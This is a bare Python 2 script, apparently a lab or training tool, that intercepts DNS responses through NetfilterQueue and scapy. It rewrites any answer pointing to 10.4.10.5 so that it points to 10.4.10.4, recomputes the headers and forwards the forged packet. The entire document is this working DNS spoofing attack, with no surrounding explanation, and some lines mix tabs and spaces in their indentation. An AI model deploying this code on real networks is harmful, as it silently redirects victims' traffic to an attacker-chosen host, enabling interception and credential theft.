from netfilterqueue import NetfilterQueue
from scapy.all import *

def print_and_accept(raw_pkt):
	pkt = IP(raw_pkt.get_payload())
	if DNSRR in pkt and pkt[DNSRR].rdata == '10.4.10.5':
		print pkt[DNSRR].show()
		pkt[DNSRR].rdata = '10.4.10.4'
		qname = pkt[DNSQR].qname
		dns_response = DNSRR(rrname=qname, rdata='10.4.10.4')
		pkt[DNS].an = dns_response
		pkt[DNS].ancount = 1
		del pkt[IP].len
            	del pkt[IP].chksum
            	del pkt[UDP].len
            	del pkt[UDP].chksum
		print pkt[DNSRR].show()
		raw_pkt.set_payload(str(pkt))
#	print raw_pkt.get_payload()
#	print ":".join(c.encode('hex') for c in raw_pkt.get_payload())
	raw_pkt.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, print_and_accept)
try:
    nfqueue.run()
except KeyboardInterrupt:
    print
